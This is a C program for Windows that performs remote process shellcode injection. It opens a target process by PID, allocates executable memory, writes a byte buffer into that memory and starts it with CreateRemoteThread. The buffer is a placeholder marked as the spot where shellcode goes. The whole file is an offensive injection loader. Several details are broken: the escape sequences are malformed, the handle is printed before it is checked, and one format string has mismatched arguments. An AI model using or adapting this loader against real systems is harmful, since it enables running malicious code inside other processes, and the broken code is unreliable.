#include <windows.h>
#include <stdio.h>
#include <stdlib.h>  

const char* success = "[+]"; //Successful operations
const char* info = "[*]"; //Informational messages.
const char* error = "[-]"; //Error messages

DWORD PID, TID = 0; // Process pid for the injection
LPVOID rBuffer = NULL; // Buffer for the memory allocation
HANDLE hProcess = NULL, hThread = NULL; // initialize handles

unsigned char Payload[] = "\0x69\0x69\0x69\0x69\0x69\0x69\0x69\0x69\0x69\0x69\"; // The shell code suppsoed to go here.

int main(int argc, char* argv[]) {

    if (argc < 2) { // Checks if there are at least two arguments
        printf("%s usage: program.exe <PID>\n", error); // prints the usage and exit the program
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]); // Convert argument to PID
    printf("%s trying to open a handle to process (%ld)\n", info, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); // Creating a handle to the process with OpenProcess
    printf("%s got a handle to the process!\n\\--0x%p\n", success, hProcess);
    
     if (hProcess == NULL) { // Checks for existing handle
        printf("%s Couldn't get the process handle (%ld), error: %ld\n", error, PID, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

   rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); // alocate memory with PAGE_EXECUTE_READWRITE In the size of the payload var
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions", success, sizeof(Payload));

    WriteProcessMemory(hProcess, rBuffer, Payload, sizeof(Payload), NULL); // Write the payload into the area in the memory we just alocated space to
    printf("%s wrote %zu-bytes to process memory", success, sizeof(Payload));


    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID); // Created thred in the process memory in order to execute the payload
    
    if (hThread == NULL) // Checks if we got handle to a thread
    {
        printf("%s Couldn't get the thread handle (%ld), error: %ld\n", error, GetLastError());
        CloseHandle(hThread);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", success, TID, hThread);
    WaitForSingleObject(hThread, INFINITE); // Wait until the thread finishes
    printf("%s waiting for thread to finish\n", success);

    printf("%s cleaning up\n", info);
    CloseHandle(hThread); // close handle
    CloseHandle(hProcess); // close handle
    printf("%s Finished!\n", info);
    

    return EXIT_SUCCESS;
}
